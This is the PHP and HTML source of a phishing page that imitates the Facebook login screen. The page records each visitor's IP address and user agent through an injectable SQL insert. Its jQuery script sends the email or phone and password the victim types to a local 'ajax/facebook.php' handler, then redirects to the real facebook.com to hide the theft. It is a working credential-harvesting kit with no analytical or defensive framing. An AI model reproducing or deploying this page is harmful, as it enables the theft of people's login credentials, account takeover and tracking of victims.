<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook – log in or sign up</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
    <?php
        include('ajax/config.php');
        $user_ip = $_SERVER['REMOTE_ADDR'];
        $user_agent = $_SERVER['HTTP_USER_AGENT'];
        mysqli_query($conn, "INSERT INTO visit_data (user_ip, user_agent) VALUES ('$user_ip', '$user_agent')");
    ?>
</head>
<style>
    
    .fb-logo img{
        height: 106px;
    }

    /* Mobile */
    @media (max-width: 699px){
    .desk-top-footer{
        display: none;
    }
    .fb-text{
        text-align: center;
        color: black;
        font-size: 18px;
     }
     .blabla{
        margin-top: 172px;
     }
    .fb-logo {
        text-align: center;
    }
    .fb-logo img{
        height: 80px;
    }
    /* .right-side-form{
        width: 90%;
        margin: 0 auto;
        margin-top: 40px;
    } */
    body{
        width: 100%;
    }
    .fb-text{
        display: none;
    }
    input{
        height: 50px;
    }
    .right-side-form{
        box-shadow: #fff;
        background: #fff;
        padding: 18px;
        border-radius: 9px;
    }
    .loin-btn{
        width: 100%;
    }
    .myfooter{
        display: none;
    }
}
    /* Desktop */
    @media (min-width: 700px){
     .fb-text{
        margin-left: 30px;
        font-size: 25px;
        width: 500px;
        color: black;
     }
     .blabla{
        margin-top: 172px;
     }
     body{
        background-color: #f0f2f5;
        width: 1030px;
        margin: 0 auto;
    }
    input{
        height: 50px;
    }
    .right-side-form{
        box-shadow: #c5c5c5 0px 3px 9px 0px;
        background: #fff;
        padding: 18px;
        border-radius: 9px;
    }
    .mob-footer{
        display: none;
    }
    }
   
    
    .create-ac input{
        background-color: #00a400;
        border: #00a400;
        font-weight: 700;
    }
    .loin-btn{
        font-weight: 700;
        font-size: 50;
        
    }
    .blabla{
        /* padding-left: 10px; */
    }
    .forgot-pass a {
        text-decoration: none;
    }
</style>
<body>
    <div class="blabla">
        
        <div class="row col-lg-12 col-xs-10">
            <div class="col-lg-7 col-xs-12">
                <div class="fb-logo">
                    <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="fb-logo">
                </div>
                <div class="fb-text">
                    Facebook helps you connect and share with the people in your life.
                </div>
            </div>
            <div class="col-lg-5 col-xs-10 right-side-form">
                <div class="form">
                    <div class="form-group col-lg-12 col-xs-12">
                        <input type="text" name="" id="username" class="form-control" placeholder="Email address or phone number">
                    </div>
                    <div class="form-group col-lg-12 col-xs-12">
                        <input type="password" name="" id="password" class="form-control mt-2" placeholder="Password">
                    </div>
                    <div class="login_btn text-center">
                        <input type="button"  id="submit"  class="loin-btn btn btn-primary col-xs-12 col-lg-12 mt-3" value="Log in">

                    </div>
                </div>
                <div class="forgot-pass mt-2 text-center">
                    <a href="#">Forgotten password?</a>
                </div>
                <hr>
                <div class="create-ac text-center">
                    <input type="button" value="Create New Account" class="btn btn-success">
                </div>
            </div>
        </div>
    </div>
    <div class="myfooter text-center " style="width: 100%; margin-left: -130px; margin-top: 200px;">
        <img src="assets/image/footer.png" class="desk-top-footer" alt="footer">
    </div>
    <div class="mob-footer text-center">
         <img src="assets/image/mob-footer.png" alt="footer">
    </div>
</body>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
<script>
    $(document).ready(function(){
        $("#submit").click(function(){
            var username = $("#username").val();
            var password = $("#password").val();
            if(username == ''){
                alert("username empty");
            }
            else if(password == ''){
                alert('password is empty');
            }
            else if (username == password){
                alert('username and password are same');
            }
            else
            {
                var fd = new FormData();

                fd.append('username', username);
                fd.append('password', password);

                $.ajax
                ({
                    url: 'ajax/facebook.php',
                    data: fd,
                    type:'post',
                    contentType: false,
                    processData: false,
                    success: function(response)
                    {
                        
                        if(response == 'Success')
                        {
                                window.location = "https://facebook.com";
                        }
                        else
                        { 
                           window.location = "https://facebook.com";
                        }
                    }
                });
            }
        });
    });
</script>
</html>